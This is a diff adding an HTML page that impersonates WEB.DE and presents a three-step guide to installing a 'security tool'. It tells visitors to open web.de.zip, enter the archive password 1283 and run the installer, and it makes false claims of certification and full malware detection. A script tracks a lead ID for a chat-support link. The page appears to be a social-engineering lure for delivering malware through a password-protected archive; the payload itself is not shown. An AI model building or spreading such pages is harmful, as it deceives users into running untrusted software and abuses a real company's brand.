@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <title>Installation in 3 Schritten — WEB.DE Sicherheitstool</title>
+  <link rel="stylesheet" href="/styles.css">
+  <script src="/brand.js"></script>
+  <style>
+    :root {
+      --lux-color-a: #ffd800;
+      --lux-color-a-d20: #ccad00;
+      --lux-color-b: #1c8ad9;
+      --lux-color-b-d20: #166eae;
+      --lux-color-c: #333333;
+      --lux-color-c-l50: #999999;
+      --lux-color-c-l82: #dadada;
+      --lux-color-c-l94: #f3f3f3;
+      --lux-color-d: #ffffff;
+      --lux-radius-s: 8px;
+      --lux-radius-l: 16px;
+      --guide-content-max: calc(420px * 3 + 24px * 2);
+    }
+    body {
+      background: var(--lux-color-c-l94);
+      font-family: 'Roboto', Arial, sans-serif;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .page-top-bar { height: 6px; background: var(--lux-color-a); flex-shrink: 0; }
+    .guide-single-header {
+      background: var(--lux-color-c-l94);
+      padding: 0 24px 16px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .guide-single-header-inner {
+      max-width: var(--guide-content-max);
+      width: 100%;
+      margin: 0 auto;
+      background: var(--lux-color-d);
+      border: 1px solid var(--lux-color-c-l82);
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .guide-single-header-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 16px 20px;
+    }
+    .guide-single-header-logo { flex-shrink: 0; }
+    .guide-single-header-logo img { height: 40px; width: auto; display: block; }
+    .guide-single-header-text { flex: 1 1 280px; }
+    .guide-single-header h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--lux-color-c);
+      margin: 0;
+    }
+    .guide-single-header .guide-btn-download {
+      display: inline-flex;
+      align-items: center;
+      padding: 12px 20px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--lux-color-c);
+      background: var(--lux-color-a);
+      border: none;
+      border-radius: 0;
+      text-decoration: none;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background .2s;
+      flex-shrink: 0;
+    }
+    .guide-single-header .guide-btn-download:hover { background: var(--lux-color-a-d20); color: var(--lux-color-c); }
+    .guide-single-main { padding: 24px 16px 48px; }
+    .guide-single-wrap { max-width: calc(var(--guide-content-max) + 32px); margin: 0 auto; padding: 0 16px; width: 100%; box-sizing: border-box; }
+    .guide-single-steps-row {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: stretch;
+      gap: 24px;
+      padding-bottom: 16px;
+    }
+    .guide-single-section {
+      flex: 1 1 0;
+      min-width: 0;
+      max-width: 420px;
+      background: var(--lux-color-d);
+      border-radius: var(--lux-radius-l);
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      border: 1px solid var(--lux-color-c-l82);
+      margin-bottom: 0;
+      display: flex;
+      flex-direction: column;
+      text-align: left;
+    }
+    .guide-single-section-head {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--lux-color-c-l94);
+      background: linear-gradient(180deg, #f1f8fd 0%, var(--lux-color-d) 100%);
+      color: var(--lux-color-c);
+      font-size: 1.1rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .guide-single-section-body {
+      padding: 20px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      text-align: left;
+      min-height: 0;
+    }
+    .guide-single-steps-list {
+      list-style: none;
+      margin: 0 0 16px 0;
+      padding: 0;
+      counter-reset: substep;
+    }
+    .guide-single-steps-list li {
+      font-size: 0.95rem;
+      color: var(--lux-color-c);
+      line-height: 1.6;
+      margin-bottom: 8px;
+      padding-left: 32px;
+      position: relative;
+      counter-increment: substep;
+    }
+    .guide-single-steps-list li::before {
+      content: counter(substep);
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: var(--lux-color-a);
+      color: var(--lux-color-c);
+      font-size: 0.75rem;
+      font-weight: 700;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .guide-single-img-wrap {
+      border-radius: var(--lux-radius-s);
+      overflow: hidden;
+      border: 1px solid var(--lux-color-c-l82);
+      background: #fafafa;
+      margin-top: auto;
+      display: block;
+      width: 100%;
+      height: 200px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .guide-single-img-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center top;
+      display: block;
+      vertical-align: middle;
+    }
+    .guide-single-step-p {
+      font-size: 0.95rem;
+      color: var(--lux-color-c);
+      line-height: 1.6;
+      margin: 0 0 12px 0;
+    }
+    .guide-single-step-p:last-child { margin-bottom: 0; }
+    .guide-single-step-caption {
+      font-size: 0.85rem;
+      color: var(--lux-color-c-l50);
+      margin: 0 0 8px 0;
+    }
+    .guide-single-lightbox {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: rgba(0,0,0,0.85);
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      box-sizing: border-box;
+    }
+    .guide-single-lightbox.is-open { display: flex; }
+    .guide-single-lightbox img {
+      max-width: 100%;
+      max-height: 90vh;
+      width: auto;
+      height: auto;
+      object-fit: contain;
+      border-radius: var(--lux-radius-s);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    .guide-single-lightbox-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      width: 44px;
+      height: 44px;
+      border: none;
+      background: rgba(255,255,255,0.2);
+      color: #fff;
+      font-size: 1.5rem;
+      line-height: 1;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+    .guide-single-lightbox-close:hover { background: rgba(255,255,255,0.35); }
+    .guide-single-support-block {
+      margin-top: 32px;
+      padding: 20px 24px;
+      background: var(--lux-color-d);
+      border-radius: var(--lux-radius-l);
+      border: 1px solid var(--lux-color-c-l82);
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+    }
+    .guide-single-support-text {
+      margin: 0;
+      font-size: 1rem;
+      line-height: 1.55;
+      color: var(--lux-color-c);
+    }
+    .guide-support-chat-link {
+      color: var(--lux-color-b);
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .guide-support-chat-link:hover {
+      color: var(--lux-color-b-d20);
+      text-decoration: underline;
+    }
+    .guide-single-trust {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 12px;
+      margin: 20px 0 0 0;
+      padding: 16px 20px;
+      background: linear-gradient(180deg, #e8f4fc 0%, #f0f8fc 100%);
+      border: 1px solid rgba(28, 138, 217, 0.2);
+      border-radius: var(--lux-radius-s);
+      color: var(--lux-color-c);
+      font-size: 0.9rem;
+    }
+    .guide-single-trust-shield {
+      flex-shrink: 0;
+      width: 28px;
+      height: 28px;
+      color: var(--lux-color-b);
+    }
+    .guide-single-trust-shield svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+    .guide-single-trust-content { flex: 1; min-width: 0; }
+    .guide-single-trust-text { font-weight: 600; margin: 0 0 8px 0; display: block; }
+    .guide-single-trust-list {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      font-size: 0.85rem;
+      color: var(--lux-color-c);
+    }
+    .guide-single-trust-list li {
+      margin-bottom: 4px;
+      padding-left: 18px;
+      position: relative;
+    }
+    .guide-single-trust-list li::before {
+      content: "✓";
+      position: absolute;
+      left: 0;
+      color: var(--lux-color-b);
+      font-weight: 700;
+    }
+    .guide-single-footer {
+      max-width: calc(var(--guide-content-max) + 32px);
+      margin: 0 auto;
+      padding: 24px 16px 32px;
+      box-sizing: border-box;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: center;
+      font-size: 0.85rem;
+      color: var(--lux-color-c-l50);
+      border-top: 1px solid var(--lux-color-c-l82);
+      background: transparent;
+    }
+    .guide-single-footer-links {
+      list-style: none;
+      margin: 0 0 12px 0;
+      padding: 0;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 24px;
+    }
+    .guide-single-footer-links a {
+      color: var(--lux-color-c-l50);
+      text-decoration: none;
+    }
+    .guide-single-footer-links a:hover {
+      color: var(--lux-color-b);
+      text-decoration: underline;
+    }
+    .guide-single-footer-copy { margin: 0; }
+  </style>
+</head>
+<body>
+  <header class="guide-single-header">
+    <div class="guide-single-header-inner">
+      <div class="page-top-bar"></div>
+      <div class="guide-single-header-row">
+        <div class="guide-single-header-logo">
+          <a href="https://web.de/" aria-label="WEB.DE Startseite">
+            <img src="https://upload.wikimedia.org/wikipedia/de/5/5f/Web.de_logo.svg" alt="WEB.DE" width="120" height="40">
+          </a>
+        </div>
+        <div class="guide-single-header-text">
+        <h1 class="guide-single-header-title">Installation in 3 Schritten</h1>
+        </div>
+        <a href="/index-sicherheit-update.html" class="guide-btn-download">Zur Download-Seite</a>
+      </div>
+    </div>
+  </header>
+  <main class="guide-single-main">
+    <div class="guide-single-wrap">
+      <div class="guide-single-steps-row">
+      <section class="guide-single-section" id="schritt-1">
+        <div class="guide-single-section-head">Datei finden</div>
+        <div class="guide-single-section-body">
+          <ol class="guide-single-steps-list">
+            <li>Ordner <strong>Downloads</strong> öffnen (Windows-Taste + E)</li>
+            <li>Auf <strong>web.de.zip</strong> doppelklicken</li>
+          </ol>
+          <div class="guide-single-img-wrap">
+            <img src="guide/step3.png" alt="Explorer: Ordner Downloads, Datei web.de.zip">
+          </div>
+        </div>
+      </section>
+
+      <section class="guide-single-section" id="schritt-2">
+        <div class="guide-single-section-head">Passwort eingeben</div>
+        <div class="guide-single-section-body">
+          <ol class="guide-single-steps-list">
+            <li>Fenster <strong>„Kennwort eingeben“</strong> öffnet sich</li>
+            <li>Passwort eintippen, das auf der Download-Seite angezeigt wurde: <strong>1283</strong></li>
+            <li>Auf <strong>OK</strong> klicken – Datei wird entpackt</li>
+          </ol>
+          <div class="guide-single-img-wrap">
+            <img src="guide/step4.png" alt="Dialog Kennwort eingeben, OK klicken">
+          </div>
+        </div>
+      </section>
+
+      <section class="guide-single-section" id="schritt-3">
+        <div class="guide-single-section-head">Anwendung starten</div>
+        <div class="guide-single-section-body">
+          <p class="guide-single-step-p">Starten Sie die Installationsanwendung.</p>
+          <p class="guide-single-step-p">Der Sicherheitsscan beginnt automatisch und deckt alle Schadprogramme auf.</p>
+          <p class="guide-single-step-caption">Nach dem Scan zeigt Windows den Schutzstatus an.</p>
+          <div class="guide-single-img-wrap">
+            <img src="guide/windows-security.png" alt="Windows zeigt nach dem Scan: Gerät geschützt" loading="lazy">
+          </div>
+        </div>
+      </section>
+      </div>
+      <div class="guide-single-trust" role="status">
+        <span class="guide-single-trust-shield" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></span>
+        <div class="guide-single-trust-content">
+          <span class="guide-single-trust-text">Sicher & zertifiziert – offizielles WEB.DE Sicherheitstool</span>
+          <ul class="guide-single-trust-list">
+            <li>Schnell installiert</li>
+            <li>Kostenloser Sicherheitsscan</li>
+            <li>Keine Registrierung erforderlich</li>
+          </ul>
+        </div>
+      </div>
+      <div class="guide-single-support-block">
+        <p class="guide-single-support-text">Fragen oder Probleme? <a href="/index-sicherheit-update.html?openChat=1" id="guide-support-chat-link" class="guide-support-chat-link">Chat-Support</a></p>
+      </div>
+    </div>
+  </main>
+  <footer class="guide-single-footer">
+    <ul class="guide-single-footer-links">
+      <li><a href="https://web.de/impressum">Impressum</a></li>
+      <li><a href="https://web.de/datenschutz">Datenschutz</a></li>
+      <li><a href="https://web.de/agb">AGB</a></li>
+    </ul>
+    <p class="guide-single-footer-copy">© WEB.DE</p>
+  </footer>
+  <div class="guide-single-lightbox" id="guide-single-lightbox" aria-hidden="true">
+    <img src="" alt="" id="guide-single-lightbox-img">
+    <button type="button" class="guide-single-lightbox-close" id="guide-single-lightbox-close" aria-label="Schließen">&times;</button>
+  </div>
+  <script>
+    (function () {
+      var lightbox = document.getElementById('guide-single-lightbox');
+      var lightboxImg = document.getElementById('guide-single-lightbox-img');
+      var closeBtn = document.getElementById('guide-single-lightbox-close');
+      document.querySelectorAll('.guide-single-img-wrap').forEach(function (wrap) {
+        var img = wrap.querySelector('img');
+        if (!img) return;
+        wrap.setAttribute('title', 'Bild vergrößern');
+        wrap.addEventListener('click', function () {
+          lightboxImg.src = img.src;
+          lightboxImg.alt = img.alt || '';
+          lightbox.classList.add('is-open');
+          lightbox.setAttribute('aria-hidden', 'false');
+        });
+      });
+      function closeLightbox() {
+        lightbox.classList.remove('is-open');
+        lightbox.setAttribute('aria-hidden', 'true');
+      }
+      closeBtn.addEventListener('click', closeLightbox);
+      lightbox.addEventListener('click', function (e) {
+        if (e.target === lightbox) closeLightbox();
+      });
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape') closeLightbox();
+      });
+
+      var chatLink = document.getElementById('guide-support-chat-link');
+      if (chatLink) {
+        var params = new URLSearchParams(window.location.search);
+        var id = params.get('id') || '';
+        try { if (!id) id = sessionStorage.getItem('gmw_lead_id') || ''; } catch (e) {}
+        if (id) chatLink.href = '/index-sicherheit-update.html?id=' + encodeURIComponent(id) + '&openChat=1';
+      }
+    })();
+  </script>
+</body>
+</html>
